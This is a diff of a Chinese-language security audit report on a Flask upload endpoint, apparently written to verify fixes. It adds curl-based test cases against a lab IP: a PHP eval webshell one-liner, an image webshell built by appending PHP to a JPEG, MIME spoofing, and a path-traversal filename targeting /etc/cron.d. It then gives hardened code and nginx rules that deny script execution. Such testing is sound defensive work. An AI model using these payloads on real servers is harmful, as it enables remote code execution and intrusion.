+| 目标 | `http://192.168.139.128:5000` |
+| 上传接口 | `POST /upload` |
+| 会话 | 使用已登录 Session |
 
-### 安全加固对比雷达图
+### 测试用例
+
+#### 测试 1：上传 PHP Webshell
+
+```bash
+# 创建测试文件
+echo '<?php @eval($_POST["cmd"]); ?>' > shell.php
+
+# 上传
+curl -X POST http://192.168.139.128:5000/upload \
+  -b "session=xxx" \
+  -F "file=@shell.php"
+
+# 修复前结果：上传成功，返回 /static/uploads/shell.php
+# 修复后结果：❌ 拦截 - "仅允许上传图片文件"
+```
+
+#### 测试 2：路径遍历攻击
+
+```bash
+# 使用 curl 的 -F 参数模拟路径遍历文件名
+curl -X POST http://192.168.139.128:5000/upload \
+  -b "session=xxx" \
+  -F "file=@shell.jpg;filename=../../../etc/cron.d/shell"
+
+# 修复前结果：文件写入 /etc/cron.d/shell
+# 修复后结果：❌ 拦截 - basename 过滤后文件名为 shell，扩展名检查失败
+```
+
+#### 测试 3：伪造扩展名的图片马
+
+```bash
+# 制作图片马
+cp normal.jpg shell.jpg
+echo '<?php @eval($_POST["cmd"]); ?>' >> shell.jpg
+
+# 上传
+curl -X POST http://192.168.139.128:5000/upload \
+  -b "session=xxx" \
+  -F "file=@shell.jpg"
+
+# 修复前结果：上传成功（扩展名为 jpg）
+# 修复后结果：✅ 扩展名通过 → MIME 通过 → Magic Bytes 验证通过（仍是有效 jpg）
+# 注意：Magic Bytes 仅验证文件头是真实图片格式，图片马本身无法通过此方式完全防御
+# 建议配合服务器配置禁止图片目录脚本执行权限
+```
+
+#### 测试 4：MIME 伪造攻击
+
+```bash
+# 上传 PHP 文件但伪造 Content-Type
+curl -X POST http://192.168.139.128:5000/upload \
+  -b "session=xxx" \
+  -H "Content-Type: multipart/form-data" \
+  -F "file=@shell.php;type=image/jpeg"
+
+# 修复前结果：上传成功
+# 修复后结果：❌ 拦截 - 扩展名校验不通过（.php）
+```
+
+### 验证结果汇总
+
+| 测试用例 | 修复前 | 修复后 | 拦截层级 |
+|----------|--------|--------|----------|
+| 上传 `shell.php` | ✅ 成功 | ❌ 拦截 | 扩展名白名单 |
+| 上传 `evil.jsp` | ✅ 成功 | ❌ 拦截 | 扩展名白名单 |
+| 路径遍历 `../../../etc/passwd` | ✅ 成功 | ❌ 拦截 | basename 过滤 |
+| 路径遍历 `../../app.py` | ✅ 成功 | ❌ 拦截 | basename + 扩展名 |
+| 同名文件覆盖 | ✅ 覆盖 | ❌ UUID 隔离 | 重命名机制 |
+| MIME 伪造 `application/x-php` | ✅ 成功 | ❌ 拦截 | MIME 校验 |
+| 图片马 `shell.jpg`（含 PHP 代码） | ✅ 成功 | ⚠️ Magic Bytes 通过 | 需额外配置 |
+
+---
+
+## 10. 修复前后代码对比
+
+### 修复前（25 行）
+
+```python
+@app.route("/upload", methods=["GET", "POST"])
+def upload():
+    if "username" not in session:
+        return redirect("/login")
+    error = None
+    file_url = None
+    if request.method == "POST":
+        f = request.files.get("file")
+        if f and f.filename:
+            upload_dir = os.path.join(app.root_path, "static", "uploads")
+            os.makedirs(upload_dir, exist_ok=True)
+            save_path = os.path.join(upload_dir, f.filename)
+            f.save(save_path)
+            file_url = f"/static/uploads/{f.filename}"
+        else:
+            error = "请选择一个文件"
+    return render_template("upload.html", error=error, file_url=file_url)
+```
+
+### 修复后（60 行）
+
+```python
+@app.route("/upload", methods=["GET", "POST"])
+def upload():
+    if "username" not in session:
+        return redirect("/login")
+    error = None
+    file_url = None
+    if request.method == "POST":
+        f = request.files.get("file")
+        if f and f.filename:
+            # 第一层：路径遍历防护
+            safe_filename = os.path.basename(f.filename)
+
+            # 第二层：扩展名白名单
+            allowed_extensions = {"jpg", "jpeg", "png", "gif", "webp", "bmp"}
+            ext = safe_filename.rsplit(".", 1)[-1].lower() if "." in safe_filename else ""
+            if ext not in allowed_extensions:
+                error = "仅允许上传图片文件"
+                return render_template("upload.html", error=error, file_url=file_url)
+
+            # 第三层：MIME 类型校验
+            allowed_mime = {"image/jpeg", "image/png", "image/gif", "image/webp", "image/bmp"}
+            if f.mimetype and f.mimetype not in allowed_mime:
+                error = f"不支持的文件类型"
+                return render_template("upload.html", error=error, file_url=file_url)
+
+            # 第四层：Magic Bytes 文件签名验证
+            magic_bytes = f.read(8)
+            f.seek(0)
+            is_valid_image = False
+            if ext in ("jpg", "jpeg") and magic_bytes.startswith(b"\xff\xd8\xff"):
+                is_valid_image = True
+            elif ext == "png" and magic_bytes.startswith(b"\x89PNG\r\n\x1a\n"):
+                is_valid_image = True
+            elif ext == "gif" and (magic_bytes.startswith(b"GIF87a") or magic_bytes.startswith(b"GIF89a")):
+                is_valid_image = True
+            elif ext == "webp" and magic_bytes.startswith(b"RIFF") and magic_bytes[4:8] == b"WEBP":
+                is_valid_image = True
+            elif ext == "bmp" and magic_bytes.startswith(b"BM"):
+                is_valid_image = True
+            if not is_valid_image:
+                error = "文件内容与扩展名不匹配"
+                return render_template("upload.html", error=error, file_url=file_url)
+
+            # 第五层：UUID 重命名
+            import uuid
+            new_filename = f"{uuid.uuid4().hex}.{ext}"
+            upload_dir = os.path.join(app.root_path, "static", "uploads")
+            os.makedirs(upload_dir, exist_ok=True)
+            save_path = os.path.join(upload_dir, new_filename)
+            f.save(save_path)
+            file_url = f"/static/uploads/{new_filename}"
+        else:
+            error = "请选择一个文件"
+    return render_template("upload.html", error=error, file_url=file_url)
+```
+
+### 安全对比
 
 | 安全维度 | 修复前 | 修复后 |
 |----------|--------|--------|
-| SQL 注入防护 | ❌ | ✅ 参数化查询 |
-| 密码安全 | ❌ 明文 | ✅ PBKDF2 哈希 |
-| 文件上传安全 | ❌ | ✅ 3 层验证 |
-| 路径遍历防护 | ❌ | ✅ basename |
-| 敏感信息保护 | ❌ | ✅ 过滤 + 删除 |
-| 会话安全 | ❌ 硬编码 | ✅ 随机密钥 |
-| 密码强度 | ❌ 弱密码 | ✅ 强密码 |
-| 功能完整性 | ❌ 登出失效 | ✅ 已修复 |
-
-### 修改文件清单
-
-| 文件 | 修复的漏洞 |
-|------|-----------|
-| `app.py` | V-01, V-02, V-03, V-05, V-06, V-08, V-09, V-10 |
-| `templates/index.html` | V-04 |
-| `templates/login.html` | V-07 |
-| `templates/upload.html` | （新增文件，自带安全设计） |
-| `static/css/style.css` | （新增上传页样式） |
+| ✅ 路径遍历防护 | ❌ 无 | ✅ `os.path.basename()` |
+| ✅ 扩展名白名单 | ❌ 无 | ✅ 仅 6 种图片格式 |
+| ✅ MIME 校验 | ❌ 无 | ✅ 白名单匹配 |
+| ✅ Magic Bytes 验证 | ❌ 无 | ✅ 5 种图片格式签名 |
+| ✅ UUID 重命名 | ❌ 原始文件名 | ✅ 防冲突防覆盖 |
+| ✅ 文件大小限制 | ❌ 无 | ✅ 16MB |
 
 ---
 
-## 15. 残留风险与后续加固建议
+## 11. 残留风险与加固建议
 
-### 当前残留风险
+### 残留风险
 
-| 残留风险 | 等级 | 说明 | 建议 |
-|----------|------|------|------|
-| SQLite 注册密码明文存储 | 🟠 中危 | 注册用户的密码未哈希 | 注册时同步使用 `generate_password_hash` |
-| 内存字典与数据库双数据源 | 🟡 低危 | 登录认 USERS 字典，注册认 SQLite | 统一为单一数据库认证 |
-| 无 HTTPS | 🟠 中危 | 密码通过 HTTP 明文传输 | 部署 Nginx + Let's Encrypt |
-| 无登录频率限制 | 🟡 低危 | 可被暴力破解 | 添加失败次数限制 + 验证码 |
-| Debug 模式开启 | 🟡 低危 | 调试信息可能泄露 | 生产环境关闭 `debug=True` |
-| 无 CSRF 防护 | 🟡 低危 | 跨站请求伪造风险 | 添加 CSRF Token |
-| 无 session 过期 | 🟡 低危 | 用户不会自动登出 | 配置 `PERMANENT_SESSION_LIFETIME` |
+| 风险 | 说明 | 建议 |
+|------|------|------|
+| 图片马无法完全拦截 | 在合法图片尾部追加代码的图片马可通过 Magic Bytes 校验 | 配置 Nginx 禁止 `uploads/` 目录脚本执行 |
+| 超大文件变种绕过 | 分块传输可能绕过 `MAX_CONTENT_LENGTH` | 配置 Nginx 层限制请求体大小 |
+| 竞争条件 | 高并发下文件操作可能存在 TOCTOU 问题 | 使用临时文件 + 原子重命名 |
 
-### 安全加固路线图
+### 服务器层加固建议（Nginx）
 
-```
-第一阶段（已完成）
-├── 参数化查询防 SQL 注入 ✅
-├── 密码哈希存储与比对 ✅
-├── 前端密码保护 ✅
-├── 文件上传安全加固 ✅
-└── Session 密钥安全 ✅
+```nginx
+# 禁止 uploads 目录执行脚本
+location /static/uploads/ {
+    location ~ \.(php|phtml|php3|php4|jsp|asp|aspx|py|pl|sh)$ {
+        deny all;
+    }
+}
 
-第二阶段（建议 1-2 周内）
-├── 统一认证数据源
-├── 注册密码哈希
-├── HTTPS 部署
-└── 登录限流 + 验证码
-
-第三阶段（长期规划）
-├── CSRF 防护
-├── Session 过期机制
-├── 日志审计系统
-├── WAF 防护
-└── 定期安全扫描自动化
+# 限制上传大小
+client_max_body_size 16M;
 ```
 
-### 安全自检清单
+### 文件上传安全自检清单
 
-- [x] 所有 SQL 使用参数化查询
-- [x] 密码哈希存储（非明文）
-- [x] 密码哈希比对（非 `==`）
-- [x] 前端不展示密码
-- [x] 强密码策略
-- [x] Secret Key 非硬编码
-- [x] 删除敏感信息注释
-- [x] 路由装饰器完整性
 - [x] 文件扩展名白名单校验
-- [x] 文件 MIME 类型校验
-- [x] 文件 Magic Bytes 内容校验
-- [x] 文件名路径遍历防护
+- [x] 文件名路径遍历防护（`basename`）
 - [x] UUID 重命名防覆盖
-- [x] 上传大小限制
-- [ ] 注册密码哈希存储
-- [ ] HTTPS 加密传输
-- [ ] 登录频率限制
-- [ ] CSRF 防护
-- [ ] Session 过期机制
-- [ ] 生产关闭 Debug 模式
+- [x] MIME 类型白名单校验
+- [x] Magic Bytes 文件签名验证
+- [x] 文件大小限制
+- [ ] 服务器配置禁止上传目录脚本执行
+- [ ] 上传日志审计
+- [ ] 病毒扫描集成
+- [ ] 图片重新压缩编码（去除嵌入代码）
 
 ---
 
-*报告结束 | 检测工具：Manual Code Audit + Penetration Testing | 审核日期：2026-07-09*
+*报告结束 | 检测模块：文件上传功能 | 检测工具：Manual Code Audit + Penetration Testing | 审核日期：2026-07-09*
